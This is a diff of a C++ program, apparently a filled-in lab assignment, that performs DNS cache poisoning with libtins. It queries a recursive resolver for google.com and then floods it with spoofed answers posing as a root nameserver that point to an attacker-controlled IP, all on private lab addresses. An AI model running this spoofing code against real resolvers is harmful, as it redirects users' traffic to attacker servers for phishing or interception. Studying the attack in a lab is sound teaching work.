@@ -15,11 +15,11 @@ int main() {
 
     // Configuration variables
     string request_hostname = "google.com";    // Target domain to spoof
-    string root_dns_ip = "10.0.0.50";    // Spoofed source (pretending to be root DNS) - string root_dns_ip = "TODO";
-    string recursive_dns_ip = "10.0.0.40";    // Target recursive DNS server
+    string root_ns_ip = "10.0.0.50";    // Spoofed source (pretending to be root DNS) - string root_ns_ip = "TODO";
+    string recursive_ns_ip = "10.0.0.40";    // Target recursive DNS server
     string attacker_ip = "10.0.0.10";
     string attacker_server_ip = "10.0.0.20";    // IP we want to redirect traffic to
-    int recursive_dns_port = 12345;    // Port of recursive DNS server - int recursive_dns_port = TODO;
+    int recursive_ns_port = 12345;    // Port of recursive DNS server - int recursive_ns_port = TODO;
 
     PacketSender sender;    // Packet sending utility from libtins
 
@@ -42,7 +42,7 @@ int main() {
     udp /= dns;    // Attach DNS payload
 
     // IP(destination_ip,source_ip)
-    IP ip = IP(recursive_dns_ip, attacker_ip) / udp;    // Create IP layer targeting recursive DNS server - IP ip = IP(TODO, attacker_server_ip) / udp;
+    IP ip = IP(recursive_ns_ip, attacker_ip) / udp;    // Create IP layer targeting recursive DNS server - IP ip = IP(TODO, attacker_server_ip) / udp;
 
     sender.send(ip);    // Send the initial legitimate query
 
@@ -65,10 +65,10 @@ int main() {
             60    // TTL in seconds
         ));
 
-        UDP udp(recursive_dns_port, 53);    // Create UDP layer (source port: 53, destination port 12345) - UDP udp(TODO, 53);
+        UDP udp(recursive_ns_port, 53);    // Create UDP layer (source port: 53, destination port 12345) - UDP udp(TODO, 53);
         udp /= dns;    // Attach DNS payload
 
-        IP ip = IP(recursive_dns_ip, root_dns_ip) / udp;  // Create IP layer targeting recursive DNS server - IP ip = IP(recursive_dns_ip, TODO) / udp;
+        IP ip = IP(recursive_ns_ip, root_ns_ip) / udp;  // Create IP layer targeting recursive DNS server - IP ip = IP(recursive_ns_ip, TODO) / udp;
 
         sender.send(ip); // Send the spoofed response
         if (id % 1000 == 0) {
